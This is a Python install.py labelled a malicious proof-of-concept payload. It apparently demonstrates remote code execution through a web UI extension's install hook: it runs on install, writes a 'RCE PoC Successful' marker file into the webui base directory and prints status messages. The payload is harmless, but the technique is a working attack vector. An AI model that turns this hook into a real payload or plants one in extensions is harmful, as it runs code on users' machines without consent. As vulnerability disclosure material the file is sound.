# install.py (Malicious PoC Payload)
import os
import platform
import datetime

poc_file_name = "poc_extension_rce_success.txt"
# Navigate two levels up from install.py (extensions/<repo_name>/install.py) 
# to reach the webui base directory. Adjust if needed based on install path.
base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')) 
filepath = os.path.join(base_dir, poc_file_name)

message = f"""
# ============================================================
# RCE PoC Successful! Extension install.py executed.
# Time: {datetime.datetime.now()}
# Running on: {platform.system()}
# Attempted to create file: {filepath}
# ============================================================
"""

print("="*60)
print("[MALICIOUS install.py] Script execution started.")
print(f"[MALICIOUS install.py] Attempting to write PoC file to: {filepath}")

try:
    with open(filepath, "w") as f:
        f.write(message)
    print(f"[MALICIOUS install.py] Successfully created PoC file.")
    
except Exception as e:
    print(f"[MALICIOUS install.py] Error creating PoC file: {e}")
    print(f"[MALICIOUS install.py] File creation failed, but script execution proves the vulnerability.")

print(message) # Print the message regardless of file creation success
print("[MALICIOUS install.py] Script execution finished.")
print("="*60)

# Optional: Add a small delay if needed to ensure messages are flushed/visible
import time
time.sleep(2) 
